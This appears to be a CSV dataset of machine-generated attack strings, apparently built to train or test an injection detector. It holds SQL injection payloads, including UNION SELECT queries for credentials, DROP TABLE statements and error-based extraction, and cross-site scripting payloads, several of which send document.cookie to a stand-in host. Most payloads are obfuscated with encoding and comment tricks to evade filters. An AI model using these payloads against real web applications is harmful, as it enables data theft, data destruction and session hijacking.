text,label,attack_type,generator
%2522%2529%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520tokens%2529%253E0--%2520-,1,sqli,deepseek-r1
%2527%252F%252A%252A%252FOR%252F%252A%252A%252F%2527%2527%253D%2527%2527%252F%252A%252A%252F--%2520-,1,sqli,deepseek-r1
%2560%252509oR%2525091%2520BeTwEeN%25200%2520AnD%25209%252509%252F%252AX%252A%252F,1,sqli,deepseek-r1
""";+D/**/R/**/O/**/P+TABLE+admin#",1,sqli,deepseek-r1
%2527%255D%2520O/**/R%2520%2527%2527%253D%2527%2527%2520--%2520,1,sqli,deepseek-r1
"""%09aNd%09''=''%09--",1,sqli,deepseek-r1
%2560%2520uNiOn%2520sElEcT%2520NuLl%252CnUlL%252cNuLl%2523,1,sqli,deepseek-r1
"""/**/AnD/**/1=2/**//*X*/",1,sqli,deepseek-r1
%2522%2509aNd%25090%253C1%2509%252F%252Ax%252A%252F,1,sqli,deepseek-r1
')/**/AND/**/1%09LIKE%091/**/#,1,sqli,deepseek-r1
'	OR	1=1	--/**/,1,sqli,deepseek-r1
']%0aA/**/n/**/D%0a1=1%0a--,1,sqli,deepseek-r1
%2527%2529%252509AnD%2525092%253E1%252509%252523,1,sqli,deepseek-r1
""")/**/O/**/R/**/''=''/**/--",1,sqli,deepseek-r1
%2522%2529%2520UNION%2520SELECT%2520NULL%252CNULL%2523,1,sqli,deepseek-r1
')	A/**/N/**/D	1=2	--+-,1,sqli,deepseek-r1
""" oR 1 LiKe 1 -- ",1,sqli,deepseek-r1
%2522%2529%2520AND%25202%253E1%2520--%2520,1,sqli,deepseek-r1
"""%0d%0aA/**/N/**/D%0d%0a1%09BETWEEN%090%09A/**/N/**/D%099%0d%0a--%09",1,sqli,deepseek-r1
%2522%2520AND%25201%2520LIKE%25201%2520--,1,sqli,deepseek-r1
"""%09aNd%09'A'='A'%09--",1,sqli,deepseek-r1
']%0aO/**/R%0a1 BETWEEN 0 A/**/N/**/D 9%0a--,1,sqli,deepseek-r1
%2527%2529%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL--%2520-,1,sqli,deepseek-r1
`%0d%0aA/**/N/**/D%0d%0a1=1%0d%0a%23,1,sqli,deepseek-r1
%2527%253B%2520DROP%2520TABLE%2520orders%252523,1,sqli,deepseek-r1
')	Or	1%09bEtWeEn%090%09aNd%099	--%09-,1,sqli,deepseek-r1
')+Or+1=1+--+,1,sqli,deepseek-r1
`%0aA/**/N/**/D%0a2>1%0a/*x*/,1,sqli,deepseek-r1
%2527%2520OR%25201%2520LIKE%25201%2520--,1,sqli,deepseek-r1
%2522%2509OR%2509%2527%2527%253D%2527%2527%2509%252F%252Ax%252A%252F,1,sqli,deepseek-r1
%2560%252509UNION%252509SELECT%252509role%252Caccount%252509FROM%252509accounts--,1,sqli,deepseek-r1
""")%0aAnD%0a''=''%0a/*X*/",1,sqli,deepseek-r1
%2527%255D%2520UnIoN%2520SeLeCt%2520aCcOuNt%252CrOlE%252cEmAiL%2520FrOm%2520sTaFf%2523,1,sqli,deepseek-r1
`%09AND%091+BETWEEN+0+AND+9%09--+-,1,sqli,deepseek-r1
"""%09OR%091=1%09--%0a-",1,sqli,deepseek-r1
"""%0D%0aAnD%0d%0A''=''%0D%0a#",1,sqli,deepseek-r1
`/**/AND/**/1%0aBETWEEN%0a0%0aAND%0a9/**/%23,1,sqli,deepseek-r1
']/**/A/**/N/**/D/**/2>1/**/-- -,1,sqli,deepseek-r1
""")%0aOR%0a2>1%0a/*x*/",1,sqli,deepseek-r1
%2560%252BOR%252B1%2520BETWEEN%25200%2520AND%25209%252B%252F%252Ax%252A%252F,1,sqli,deepseek-r1
%2527%255D%2520AnD%25202%253e1%2520%2523,1,sqli,deepseek-r1
%2527%255D%2520OR%25200%253C1%2520%2523,1,sqli,deepseek-r1
%2522%25250D%25250aOr%25250D%25250a1%2520BeTwEeN%25200%2520AnD%25209%25250d%25250A--%2520-,1,sqli,deepseek-r1
'/**/AnD/**/'A'='A'/**//*X*/,1,sqli,deepseek-r1
""")/**/o/**/R/**/0<1/**/#",1,sqli,deepseek-r1
%2560%2509aNd%25091%253D2%2509%252f%252Ax%252A%252f,1,sqli,deepseek-r1
'%09A/**/N/**/D%092>1%09/*x*/,1,sqli,deepseek-r1
'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/admin)>0/*x*/,1,sqli,deepseek-r1
')/**/oR/**/'A'='A'/**//*X*/,1,sqli,deepseek-r1
%2522%252509OR%2525091%253D2%252509%2523,1,sqli,deepseek-r1
"') U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T email,pwd,passwo/**/rd,id,token F/**/R/**/O/**/M admin#",1,sqli,deepseek-r1
""" oR 0<1 -- -",1,sqli,deepseek-r1
'%09aNd%09''=''%09--,1,sqli,deepseek-r1
%2527%255D%25250aAND%25250a%2527a%2527%253D%2527a%2527%25250a--%2520,1,sqli,deepseek-r1
%2522%2529%252509OR%2525091%253D1%252509--%2520,1,sqli,deepseek-r1
%2522%2529%252F%252A%252A%252FOR%252F%252A%252A%252F2%253E1%252F%252A%252A%252F%252F%252Ax%252A%252F,1,sqli,deepseek-r1
%2522%2529%25250aOR%25250a1%253D1%25250a%252F%252Ax%252A%252F,1,sqli,deepseek-r1
%2527%255D%252509AND%2525090%253C1%252509%252523,1,sqli,deepseek-r1
']+O/**/R+''=''+--,1,sqli,deepseek-r1
%2560%2520UNION%2520SELECT%2520NULL%252CNULL%252CNULL--%2520-,1,sqli,deepseek-r1
')	O/**/R	''=''	#,1,sqli,deepseek-r1
"""+O/**/R+0<1+-- ",1,sqli,deepseek-r1
%2560%25250d%25250aA/**/N/**/D%25250d%25250a1%253D2%25250d%25250a--,1,sqli,deepseek-r1
'	AND	''=''	--/**/-,1,sqli,deepseek-r1
%2527%253B%2520DROP%2520TABLE%2520sessions%252F%252Ax%252A%252F,1,sqli,deepseek-r1
"` aNd eXtRaCtVaLuE(1,CoNcAt(0X7E,(sElEcT LaSt_nAmE FrOm tOkEnS LiMiT 1)))",1,sqli,deepseek-r1
`+aNd+'A'='A'+/*x*/,1,sqli,deepseek-r1
%2527%2509AND%25091%253D1%2509%252523,1,sqli,deepseek-r1
'/**/Or/**/1=1/**/%23,1,sqli,deepseek-r1
""")+AnD+'a'='a'+--",1,sqli,deepseek-r1
%2527%255D%25250d%25250aAND%25250d%25250a%2527%2527%253D%2527%2527%25250d%25250a--%2520,1,sqli,deepseek-r1
"')+AND+extractvalue(1,concat(0x7e,(SELECT+account+FROM+members+LIMIT+1)))",1,sqli,deepseek-r1
%2522%2520OR%2520%2528SELECT%2520last_name%2520FROM%2520accounts%2520WHERE%2520last_name%253D224%2529%253D71,1,sqli,deepseek-r1
%2527%255D%25250aA/**/N/**/D%25250a0%253C1%25250a--,1,sqli,deepseek-r1
%2522%2529%2520OR%2520%2528SELECT%2520pwd%2520FROM%2520sessions%2520WHERE%2520pwd%253D946%2529%253D611,1,sqli,deepseek-r1
') O/**/r (S/**/e/**/L/**/e/**/C/**/t eMaIl f/**/R/**/o/**/M UsErS WhErE EmAiL=250)=785,1,sqli,deepseek-r1
%2527%2509O%252F%252A%252A%252FR%2509%2527%2527%253D%2527%2527%2509--%2520,1,sqli,deepseek-r1
""") Or (SeLeCt aCcOuNt fRoM ToKeNs wHeRe aCcOuNt=532)=357",1,sqli,deepseek-r1
`%0aA/**/N/**/D%0a0<1%0a--,1,sqli,deepseek-r1
%2527%255D%25250d%25250aAND%25250d%25250a1%252509BETWEEN%2525090%252509AND%2525099%25250d%25250a%252F%252Ax%252A%252F,1,sqli,deepseek-r1
""")%0aOr%0A''=''%0A--",1,sqli,deepseek-r1
"""%09oR%091 LiKe 1%09-- -",1,sqli,deepseek-r1
%2522%2529%25250aOr%25250A1%253D2%25250A--,1,sqli,deepseek-r1
']/**/A/**/N/**/D/**/1 BETWEEN 0 A/**/N/**/D 9/**/-- ,1,sqli,deepseek-r1
`%0AoR%0a0<1%0a#,1,sqli,deepseek-r1
"']+UNION+SELECT+name,uid,pwd+FROM+staff/*x*/",1,sqli,deepseek-r1
""") O/**/r 1=1 lImIt 1--",1,sqli,deepseek-r1
%2527%2529%252BOR%252B1%2520LIKE%25201%252B%252523,1,sqli,deepseek-r1
%2560%252509AND%2525092%253E1%252509%252F%252Ax%252A%252F,1,sqli,deepseek-r1
%2560%2509aNd%25091%2520bEtWeEn%25200%2520aNd%25209%2509%2523,1,sqli,deepseek-r1
%2522%2529%2520U%252F%252A%252A%252FN%252F%252A%252A%252FI%252F%252A%252A%252FO%252F%252A%252A%252FN%2520S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520name%252Cpasswo%252F%252A%252A%252Frd%252Cuser%252Cpwd%2520F%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FM%2520admin%2523,1,sqli,deepseek-r1
'/**/Or/**/2>1/**/--/**/-,1,sqli,deepseek-r1
%2527%2529%25250aAND%25250a%2527a%2527%253D%2527a%2527%25250a%252F%252Ax%252A%252F,1,sqli,deepseek-r1
']%09A/**/N/**/D%091=2%09#,1,sqli,deepseek-r1
%2522%2509O/**/R%25091%253D2%2509--,1,sqli,deepseek-r1
']%09Or%092>1%09--+-,1,sqli,deepseek-r1
""")	Or	1 lIkE 1	--",1,sqli,deepseek-r1
')%09O/**/R%09'a'='a'%09--,1,sqli,deepseek-r1
""") O/**/R (S/**/E/**/L/**/E/**/C/**/T token F/**/R/**/O/**/M credentials WHERE token=776)=800",1,sqli,deepseek-r1
%2527%252BaNd%252B1%253D1%252B--,1,sqli,deepseek-r1
%2527%2529%253B%2520dRoP%2520TaBlE%2520StAfF%252F%252Ax%252A%252F,1,sqli,deepseek-r1
""")%0d%0AoR%0d%0A'A'='A'%0D%0a/*X*/",1,sqli,deepseek-r1
%2527%2529%2520UNION%2520SELECT%2520name%252Caccount%2520FROM%2520users--%2520-,1,sqli,deepseek-r1
%2527%255D%252F%252A%252A%252FoR%252F%252A%252A%252F1%2520bEtWeEn%25200%2520aNd%25209%252F%252A%252A%252F%252523,1,sqli,deepseek-r1
%2522%2509aNd%2509%2527A%2527%253D%2527A%2527%2509--,1,sqli,deepseek-r1
%2527%255D%252BOR%252B2%253E1%252B%252523,1,sqli,deepseek-r1
`%0d%0aAND%0d%0a0<1%0d%0a--%09,1,sqli,deepseek-r1
' aNd 1=2 /*x*/,1,sqli,deepseek-r1
`%0d%0aOR%0d%0a1+BETWEEN+0+AND+9%0d%0a--+-,1,sqli,deepseek-r1
')%0aOR%0a2>1%0a#,1,sqli,deepseek-r1
')%0aA/**/n/**/D%0a1=1%0a#,1,sqli,deepseek-r1
"')%0aUnIoN%0aSeLeCt%0aeMaIl,rOlE,NaMe,lAsT_NaMe,sTaTuS,Id%0afRoM%0aMeMbErS/*x*/",1,sqli,deepseek-r1
%2527%25250d%25250aA%252F%252A%252A%252FN%252F%252A%252A%252FD%25250d%25250a1%2520LIKE%25201%25250d%25250a%2523,1,sqli,deepseek-r1
%2522%252BA/**/N/**/D%252B1%253D2%252B--%2520,1,sqli,deepseek-r1
%2522%252F%252A%252A%252FA%252F%252A%252A%252FN%252F%252A%252A%252FD%252F%252A%252A%252F%2527a%2527%253D%2527a%2527%252F%252A%252A%252F--,1,sqli,deepseek-r1
`/**/AnD/**/1=2/**/#,1,sqli,deepseek-r1
"""%0d%0aOR%0d%0a'a'='a'%0d%0a--+",1,sqli,deepseek-r1
""")%0aA/**/N/**/D%0a'a'='a'%0a-- ",1,sqli,deepseek-r1
""")	AnD	1 BeTwEeN 0 AnD 9	-- ",1,sqli,deepseek-r1
%2522%2520uNiOn%2520sElEcT%2520NuLl%252CnUlL%252cNuLl%252CnUlL--%2520,1,sqli,deepseek-r1
`/**/A/**/N/**/D/**/1=1/**//*x*/,1,sqli,deepseek-r1
'%0AoR%0a0<1%0a--+,1,sqli,deepseek-r1
')%0d%0aAND%0d%0a2>1%0d%0a--%0a-,1,sqli,deepseek-r1
%2522%2529%25250aAND%25250a1%252BLIKE%252B1%25250a%252F%252Ax%252A%252F,1,sqli,deepseek-r1
"""%0aO/**/R%0a1 LIKE 1%0a-- ",1,sqli,deepseek-r1
')%0d%0AaNd%0D%0a''=''%0d%0A-- ,1,sqli,deepseek-r1
%2522%252509OR%2525092%253E1%252509%252523,1,sqli,deepseek-r1
`/**/AND/**/1+LIKE+1/**/--,1,sqli,deepseek-r1
""")%0aO/**/R%0a0<1%0a--",1,sqli,deepseek-r1
"""; DrOp tAbLe mEmBeRs#",1,sqli,deepseek-r1
%2522%2529%2509AND%25091%2520LIKE%25201%2509--,1,sqli,deepseek-r1
')%0d%0aA/**/N/**/D%0d%0a2>1%0d%0a--,1,sqli,deepseek-r1
'/**/A/**/N/**/D/**/''=''/**/#,1,sqli,deepseek-r1
%2527%2529%25250aAnD%25250a1%2520BeTwEeN%25200%2520AnD%25209%25250a--%2520,1,sqli,deepseek-r1
"""%09UNION%09SELECT%09NULL,NULL,NULL%23",1,sqli,deepseek-r1
%2522%2529%2520UnIoN%2520SeLeCt%2520nUlL%252cNuLl%252523,1,sqli,deepseek-r1
"'] U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T uid,role,username,email,first_name F/**/R/**/O/**/M members-- -",1,sqli,deepseek-r1
')+Or+1=2+--,1,sqli,deepseek-r1
%2522%252509oR%252509%2527a%2527%253d%2527a%2527%252509--%2520-,1,sqli,deepseek-r1
']+Or+2>1+#,1,sqli,deepseek-r1
%2560%2520oR%25201%253d1%2520LiMiT%25201--,1,sqli,deepseek-r1
%2527%255D%2520UNION%2520SELECT%2520NULL%252CNULL--%2520,1,sqli,deepseek-r1
%2527%25250aOR%25250a1%2520BETWEEN%25200%2520AND%25209%25250a%2523,1,sqli,deepseek-r1
')+OR+1+BETWEEN+0+AND+9+--+-,1,sqli,deepseek-r1
""")%09A/**/n/**/D%091=2%09/*X*/",1,sqli,deepseek-r1
'%0D%0aAnD%0d%0A'A'='A'%0D%0a%23,1,sqli,deepseek-r1
')%0aAND%0a1%0aLIKE%0a1%0a%23,1,sqli,deepseek-r1
%2527%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520users%2529%253E0%252523,1,sqli,deepseek-r1
%2522%25250aAND%25250a1%253D1%25250a%252F%252Ax%252A%252F,1,sqli,deepseek-r1
%2560%252BOR%252B1%2520BETWEEN%25200%2520AND%25209%252B--%2520,1,sqli,deepseek-r1
%2522%2529%252BAND%252Bextractvalue%25281%252Cconcat%25280x7e%252C%2528SELECT%252Bname%252BFROM%252Baccounts%252BLIMIT%252B1%2529%2529%2529,1,sqli,deepseek-r1
""" aNd (SeLeCt cOuNt(*) FrOm oRdErS)>0/*X*/",1,sqli,deepseek-r1
']%0d%0AaNd%0D%0a''=''%0d%0A-- -,1,sqli,deepseek-r1
"') UnIoN SeLeCt nUlL,NuLl#",1,sqli,deepseek-r1
"')%0aUnIoN%0aSeLeCt%0anUlL,NuLl--%0a",1,sqli,deepseek-r1
%2527%2520AND%25200%253C1%2520%2523,1,sqli,deepseek-r1
%2527%2529%252F%252A%252A%252FAND%252F%252A%252A%252F0%253C1%252F%252A%252A%252F%252F%252Ax%252A%252F,1,sqli,deepseek-r1
"""%09A/**/N/**/D%09'a'='a'%09/*x*/",1,sqli,deepseek-r1
`/**/aNd/**/''=''/**/--/**/-,1,sqli,deepseek-r1
%2522%2520aNd%2520%2528SeLeCt%2520cOuNt%2528%252a%2529%2520FrOm%2520sTaFf%2529%253e0--%2520,1,sqli,deepseek-r1
%2560%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520sessions%2529%253E0%252F%252Ax%252A%252F,1,sqli,deepseek-r1
')%0aO/**/R%0a1 LIKE 1%0a%23,1,sqli,deepseek-r1
""")%0aA/**/n/**/D%0a1 LiKe 1%0A-- ",1,sqli,deepseek-r1
"' uNiOn sElEcT RoLe,uSeRnAmE FrOm oRdErS/*x*/",1,sqli,deepseek-r1
%2522%2529%252509AND%2525091%2520LIKE%25201%252509--%2520,1,sqli,deepseek-r1
%253Cobject%2520ontoggle%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
%2522%253E%253Cdiv%2520onload%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
%2522%253E%253Ciframe%2520onpointerover%253Dprint%2528%2529%253E,1,xss,deepseek-r1
%2527%253E%253Cmarquee%2520onpointerover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
%2527%253E%253Ca%2520ontoggle%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
%2522%253E%253Cdetails%2520onfocus%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
"<SvG OnFoCuS=""lOcAtIoN='//x.iO'"">",1,xss,deepseek-r1
%2527%253E%253Csvg%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
%2522%253E%253Csvg%2520ontoggle%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
<IfRaMe oNlOaD=AlErT(1)>,1,xss,deepseek-r1
'&gt;&lt;AuDiO OnInPuT=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)&gt;,1,xss,deepseek-r1
%253Cdetails%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
&lt;input onstart=alert(1)&gt;,1,xss,deepseek-r1
"&lt;input onmouseover=""fetch('//x.io/'+document.cookie)""&gt;",1,xss,deepseek-r1
"<DiV OnLoAd=""EvAl(aToB('yWxLcNqOmSk'))"">",1,xss,deepseek-r1
%253Cdiv%2520onfocus%253Dalert%25281%2529%253E,1,xss,deepseek-r1
%253Cimg%2520onmouseover%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,deepseek-r1
%253Caudio%2520onstart%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,deepseek-r1
<IfRaMe oNtOgGlE=LoCaTiOn='//X.Io'>,1,xss,deepseek-r1
%2522%253E%253Ciframe%2520onmouseover%253Dprint%2528%2529%253E,1,xss,deepseek-r1
'><DiV OnPoInTeRoVeR=AlErT(DoCuMeNt.cOoKiE)>,1,xss,deepseek-r1
%2522%253E%253Ciframe%2520onanimationstart%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
"""><A OnFoCuS=CoNfIrM(1)>",1,xss,deepseek-r1
%253Ciframe%2520onmouseover%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,deepseek-r1
%253Cvideo%2520onpointerover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
%253Ca%2520ontoggle%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
%253Caudio%2520oninput%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,deepseek-r1
<MaRqUeE OnErRoR=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>,1,xss,deepseek-r1
'&gt;&lt;a onanimationstart=alert(document.cookie)&gt;,1,xss,deepseek-r1
<ScR<ScRiPt>iPt>fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)</sCrIpT>,1,xss,deepseek-r1
%253Cvideo%2520onerror%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,deepseek-r1
<DiV OnFoCuS=CoNfIrM(1)>,1,xss,deepseek-r1
%2522%253E%253Cdiv%2520onerror%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
'><DeTaIlS OnLoAd=pRiNt()>,1,xss,deepseek-r1
%253Cscript%2520onerror%253D%2522alert%25281%2529%2522%253E,1,xss,deepseek-r1
%2527%253E%253Cdiv%2520ontoggle%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
&lt;script onfocus=alert(1)&gt;,1,xss,deepseek-r1
%2522%253E%253Ciframe%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%2527%253E%253Cinput%2520onpointerover%253Dalert%25281%2529%253E,1,xss,deepseek-r1
%2527%253E%253Cinput%2520oninput%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%253Cinput%2520oninput%253Dalert%2528document.domain%2529%253E,1,xss,deepseek-r1
%253Cbody%2520onanimationstart%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,deepseek-r1
"<A OnMoUsEoVeR=""aLeRt(dOcUmEnT.CoOkIe)"">",1,xss,deepseek-r1
%253Caudio%2520onclick%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,deepseek-r1
%253Cscript%2520onmouseover%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,deepseek-r1
&Lt;sCr&lT;ScRiPt&gT;IpT&Gt;lOcAtIoN='//x.iO'&lT;/sCrIpT&Gt;,1,xss,deepseek-r1
%2522%253E%253Cvideo%2520onload%253Dalert%25281%2529%253E,1,xss,deepseek-r1
"&lt;DiV OnMoUsEoVeR=""lOcAtIoN='//x.iO'""&gt;",1,xss,deepseek-r1
%2527%253E%253Cbody%2520onclick%253Dalert%25281%2529%253E,1,xss,deepseek-r1
%253Ciframe%2520onclick%253Dalert%25281%2529%253E,1,xss,deepseek-r1
%2526lt%253Bdetails%2520onload%253Dlocation%253D%2527%252F%252Fx.io%2527%2526gt%253B,1,xss,deepseek-r1
%2527%253E%253Cobject%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
%2522%253E%253Ciframe%2520ontoggle%253Dprint%2528%2529%253E,1,xss,deepseek-r1
%2527%253E%253Cscript%2520onerror%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
"<ScRiPt oNmOuSeOvEr=""FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)"">",1,xss,deepseek-r1
%2522%253E%253Ciframe%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
"""&gt;&lt;iframe onstart=print()&gt;",1,xss,deepseek-r1
%253Ciframe%2520onstart%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
%2522%253E%253Cdetails%2520onmouseover%253Deval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%253E,1,xss,deepseek-r1
%253Cdetails%2520onanimationstart%253D%2522fetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%2522%253E,1,xss,deepseek-r1
%253Cinput%2520onerror%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
"&lt;div onpointerover=""fetch('//x.io/'+document.cookie)""&gt;",1,xss,deepseek-r1
"<ObJeCt oNaNiMaTiOnStArT=""aLeRt(1)"">",1,xss,deepseek-r1
%2522%253E%253Csvg%2520onmouseover%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
"""><DiV OnInPuT=AlErT(DoCuMeNt.cOoKiE)>",1,xss,deepseek-r1
%253Cvideo%2520onclick%253D%2522alert%2528document.cookie%2529%2522%253E,1,xss,deepseek-r1
%2522%253E%253cBoDy%2520oNeRrOr%253DaLeRt%2528dOcUmEnT.DoMaIn%2529%253e,1,xss,deepseek-r1
%253Cimg%2520onclick%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,deepseek-r1
%2522%253E%253Csvg%2520ontoggle%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
%2527%253E%253Cmarquee%2520onpointerover%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%253Ciframe%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
%253Cinput%2520onfocus%253D%2522eval%2528atob%2528%2527YWxlcnQoMSk%2527%2529%2529%2522%253E,1,xss,deepseek-r1
'><DeTaIlS OnInPuT=AlErT(DoCuMeNt.dOmAiN)>,1,xss,deepseek-r1
'><DiV OnLoAd=aLeRt(1)>,1,xss,deepseek-r1
%253Ciframe%2520onpointerover%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,deepseek-r1
%253Caudio%2520onerror%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
%253Cdetails%2520onmouseover%253D%2522alert%2528document.domain%2529%2522%253E,1,xss,deepseek-r1
"<ImG OnAnImAtIoNsTaRt=""AlErT(DoCuMeNt.dOmAiN)"">",1,xss,deepseek-r1
"""><InPuT OnMoUsEoVeR=PrInT()>",1,xss,deepseek-r1
'><DeTaIlS OnAnImAtIoNsTaRt=lOcAtIoN='//x.iO'>,1,xss,deepseek-r1
%2527%253E%253Ciframe%2520onpointerover%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
%253Cobject%2520onerror%253D%2522print%2528%2529%2522%253E,1,xss,deepseek-r1
"""&gt;&lt;iframe onclick=location='//x.io'&gt;",1,xss,deepseek-r1
%2527%253E%253Caudio%2520onanimationstart%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
%2522%253E%253Cvideo%2520onmouseover%253Dlocation%253D%2527%252F%252Fx.io%2527%253E,1,xss,deepseek-r1
&lt;img onpointerover=alert(document.cookie)&gt;,1,xss,deepseek-r1
"""><DeTaIlS OnLoAd=pRiNt()>",1,xss,deepseek-r1
%253Cdiv%2520onstart%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
'&gt;&lt;input onpointerover=alert(document.domain)&gt;,1,xss,deepseek-r1
<DeTaIlS OnFoCuS=FeTcH('//x.iO/'+DoCuMeNt.cOoKiE)>,1,xss,deepseek-r1
'><InPuT OnAnImAtIoNsTaRt=cOnFiRm(1)>,1,xss,deepseek-r1
"&lt;marquee onload=""print()""&gt;",1,xss,deepseek-r1
'&gt;&lt;MaRqUeE OnToGgLe=fEtCh('//X.Io/'+dOcUmEnT.CoOkIe)&gt;,1,xss,deepseek-r1
%253Cdetails%2520onload%253D%2522location%253D%2527%252F%252Fx.io%2527%2522%253E,1,xss,deepseek-r1
%253CObJeCt%2520oNpOiNtErOvEr%253D%2522AlErT%25281%2529%2522%253E,1,xss,deepseek-r1
%2526lt%253Bscript%2520onstart%253D%2522confirm%25281%2529%2522%2526gt%253B,1,xss,deepseek-r1
"""&gt;&lt;audio onanimationstart=eval(atob('YWxlcnQoMSk'))&gt;",1,xss,deepseek-r1
%2522%253E%253Cvideo%2520onfocus%253Dprint%2528%2529%253E,1,xss,deepseek-r1
%2527%253E%253Ciframe%2520onerror%253Dalert%25281%2529%253E,1,xss,deepseek-r1
%2527%253E%253CViDeO%2520OnFoCuS%253DPrInT%2528%2529%253E,1,xss,deepseek-r1
%253Cobject%2520onclick%253Dconfirm%25281%2529%253E,1,xss,deepseek-r1
'&gt;&lt;body ontoggle=alert(document.cookie)&gt;,1,xss,deepseek-r1
%253Cvideo%2520onfocus%253D%2522alert%25281%2529%2522%253E,1,xss,deepseek-r1
"""><ImG OnErRoR=AlErT(1)>",1,xss,deepseek-r1
%253Cdiv%2520onfocus%253Dfetch%2528%2527%252F%252Fx.io%252F%2527%252Bdocument.cookie%2529%253E,1,xss,deepseek-r1
'&gt;&lt;a onmouseover=eval(atob('YWxlcnQoMSk'))&gt;,1,xss,deepseek-r1
%253Ca%2520onload%253Dalert%2528document.cookie%2529%253E,1,xss,deepseek-r1
